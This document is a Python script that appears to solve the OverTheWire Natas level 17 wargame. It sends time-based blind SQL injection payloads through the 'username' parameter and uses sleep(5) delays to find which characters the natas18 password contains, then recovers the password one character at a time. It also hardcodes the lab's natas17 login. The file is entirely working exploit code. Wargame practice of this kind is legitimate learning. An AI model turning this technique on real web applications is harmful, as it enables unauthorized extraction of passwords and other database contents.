#!/usr/bin/python

import requests

natas17_user = 'natas17'
natas17_pass = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

target_base_url = 'http://natas17.natas.labs.overthewire.org/?username=natas18"'

def make_post(url):
    # print(url)
    try:
        r = requests.get(url, auth=(natas17_user, natas17_pass), timeout=1)
    except requests.exceptions.Timeout:
        return True
    return False

dictionary = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
reduced_dictionary = ''
current_pass = ''

# Find reduced dictionary to speed up bruteforce. This matches the given char to be anywhere in the password
for c in dictionary:
    url =  target_base_url + ' AND IF(password LIKE BINARY "%' + c + '%", sleep(5), null) %23'
    result = make_post(url)
    if result:
        reduced_dictionary += c
        print("Characters detected so far in password: " + reduced_dictionary)

# Find actual password. This matches only the beginning of the password
for i in range(0, 64):
    for c in reduced_dictionary:
        test_pass = current_pass + c
        url =  target_base_url + ' AND IF(password LIKE BINARY "' + test_pass + '%", sleep(5), null) %23'
        # print("Trying: " + test_pass)
        result = make_post(url)
        if result:
            current_pass = test_pass
            print("Password detected so far: " + current_pass)
            break

print("Password found: " + current_pass)
